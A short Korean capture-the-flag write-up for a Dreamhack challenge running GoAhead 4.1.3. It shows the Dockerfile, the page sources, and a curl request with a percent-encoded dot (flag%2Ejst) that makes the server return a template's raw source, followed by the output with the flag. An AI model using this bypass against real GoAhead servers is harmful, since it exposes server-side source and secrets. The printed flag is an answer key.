# 키워드
- jst
- 1day


# 코드
```dockerfile
FROM ubuntu:18.04

# Install prereqs
RUN apt update && apt install -y wget git make gcc

# Setup goahead
WORKDIR /goahead
RUN git clone https://github.com/lemonholic/goahead-archive.git
WORKDIR /goahead/goahead-archive
### Todo: Switch to the patched version.
### RUN git checkout v4.1.3.1
RUN git checkout v4.1.3

## Build/install
RUN make ME_GOAHEAD_SSL=0 ME_COM_SSL=0 && make install

# Copy in content files
COPY ./deploy/www /var/www/goahead
COPY ./deploy/goahead /etc/goahead/
WORKDIR /etc/goahead/
COPY ./deploy/start.sh .
CMD ["./start.sh"]

```

- index.html
```html
<h1>My Web Server</h1>

<a href="/jst/flag.jst">flag is here</a>
```

- /jst/flag.jst
```html
<html>
	<body>
		<h1>Can you see flag?</h1>
		<% write("read me"/*this is flag [**FLAG**]*/); %>
	</body>
</html>

```

# 분석
놀랍게도 코드가 저게 끝임
- https://github.com/f2koi/goahead-archive/tree/4.X 여기에서 1day 취약점을 찾으라는 느낌이 강했음
- 4.1.3 이슈를 확인해보니 인코딩 관련 이슈가 있었음

# exploit
- 브라우저에서는 자동으로 URL인코딩이 들어가므로 curl로 우회(?)했음
```sh
>curl http://host3.dreamhack.games:20020/jst/flag%2Ejst
<html>
        <body>
                <h1>Can you see flag?</h1>
                <% write("read me"/*this is flag DH{703ab75ab49d02bd4d7abdcb4e7ba39c}*/); %>   
        </body>
</html>
```